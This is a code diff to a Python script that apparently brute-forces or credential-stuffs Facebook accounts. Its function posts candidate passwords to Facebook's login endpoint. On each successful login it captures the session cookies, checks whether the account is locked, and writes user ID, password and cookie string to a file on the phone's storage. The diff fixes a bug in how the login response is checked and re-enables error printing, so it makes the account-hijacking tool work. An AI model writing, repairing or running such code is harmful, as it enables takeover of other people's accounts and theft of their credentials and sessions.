@@ -1249,7 +1249,6 @@ def mbasic(uid,pwx,tl):
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
-            html = po.text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1257,7 +1256,7 @@ def mbasic(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if "https://www.facebook.com/confirmemail.php?" in html or "confirmemail" in html:
+                    if "https://www.facebook.com/confirmemail.php?" in po or "confirmemail" in po:
                         print(f"{cyan}(ATOM-NV){cid}|{pw}")
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
@@ -1286,7 +1285,7 @@ def mbasic(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        #print({error})
+        print({error})
         pass
 
 def p(uid,pwx,tl):
